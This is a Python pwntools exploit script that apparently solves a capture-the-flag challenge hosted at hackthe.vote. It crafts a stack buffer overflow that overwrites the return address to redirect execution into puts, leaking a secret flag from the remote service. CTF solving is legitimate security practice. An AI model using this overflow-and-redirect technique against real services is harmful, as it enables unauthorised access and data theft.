#!/usr/bin/env python3

from pwn import *
context(arch = 'amd64', os = 'linux')

word_size = 2

domain = 'voterfraudsquared.hackthe.vote'
port = 44061
gen_only = False

magic_start = "Hi"
magic_end   = "by"
puts_addr   = 0x0001
puts_addr_middle = 0x0003
buf_addr    = 0xffc4
secret_addr = 0xffdf

# This sets bp
overflow_offset = 0x30
pc_offset = overflow_offset + word_size

ptr_to_next = buf_addr + 1
arg         = secret_addr
new_pc      = puts_addr_middle
payload = {
    0: arg,
    overflow_offset: buf_addr - word_size,
    pc_offset: new_pc,
}
#buf = flat(magic_start, payload, magic_end, filler = b'0', word_size = 16, endianness = 'little')
buf = flat(magic_start, payload, magic_end,                word_size = 16, endianness = 'little')

if gen_only:
    s = b"secret\n" + buf + b"no\n"
    s = buf + b"no\n"
    print("{}".format(repr(s)))
    open("/tmp/payload", "wb").write(s)
else:
    r = remote(domain, port)
    #r = process('/mnt/c/Users/jsc/src/elvm/out/p')
    r.readline()
    p = log.progress("sending payload")
    r.send(buf)
    p.status("reading flag")
    flag = r.readline()
    p.success("Got the flag: {}".format(flag))
    #log.info("rest: {}".format(r.recvall()))
    r.close()

    with open("flag.txt", "rb") as fd:
        real_flag = fd.read()
        if flag != real_flag:
            log.failure("real flag ({}) differs from exfiltrated flag ({})!".format(real_flag, flag))
